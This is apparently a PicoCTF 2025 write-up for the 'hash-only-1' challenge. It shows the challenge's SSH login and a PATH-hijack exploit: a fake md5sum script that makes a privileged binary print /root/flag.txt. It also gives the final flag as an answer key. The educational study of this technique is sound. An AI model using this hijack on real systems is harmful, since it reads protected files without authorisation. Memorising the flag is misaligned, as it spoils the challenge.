# PicoCTF 2025

## hash-only-1

> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!  
> Author: Junias Bonou  
> [`hash-only-1`](hash-only-1)

**Tags:** binary_exploitation

---

## ðŸ§¾ Overview

This challenge gives us a binary named `flaghasher` running on a remote server. The binary has access to `/root/flag.txt`, but instead of showing the flag, it only prints its MD5 hash. Our job is to somehow reveal the actual flag.

---

## âœ… Solution

I started by SSHing into the server:

```bash
ssh ctf-player@shape-facility.picoctf.net -p 59939
# password: a15d25e1
```

Once connected, I ran the binary:

```bash
./flaghasher
```

It responded with:

```
Computing the MD5 hash of /root/flag.txt....

3daf8ce91eaaba82780562d65223e131  /root/flag.txt
```

At that point, it was clear the binary was just calling `md5sum` on the flag file. Since it didnâ€™t use the full path (`/usr/bin/md5sum`), I figured it was using the `PATH` variable to find the command.

So I created a fake `md5sum` script in the current directory that would print the flag before passing the file along to the real `md5sum`:

```bash
echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
chmod +x md5sum
```

Then I ran the binary again with the current directory placed at the beginning of `PATH`:

```bash
PATH=.:$PATH ./flaghasher
```

This time, it printed both the actual contents of `/root/flag.txt` and the hash:

```
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
3daf8ce91eaaba82780562d65223e131  /root/flag.txt
```

It worked exactly as I had planned.

---

## Flag

```
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
```
